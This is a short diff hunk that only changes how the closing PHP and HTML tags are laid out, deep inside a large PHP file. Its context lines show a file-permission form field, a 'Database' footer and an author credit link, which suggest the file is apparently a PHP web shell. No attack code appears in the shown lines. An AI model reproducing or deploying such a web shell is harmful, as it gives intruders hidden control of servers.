@@ -5767,5 +5767,4 @@ Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o
 			echo "<hr>";
 		}
 	echo "<center>Database: ".date("D/M/Y")." - <a href='http://alxwahid.blogspot.pe/' target='_blank'><font color=red>ALx Wahid</font></a></center>";
-} ?>
-</html>
+} ?> </html>
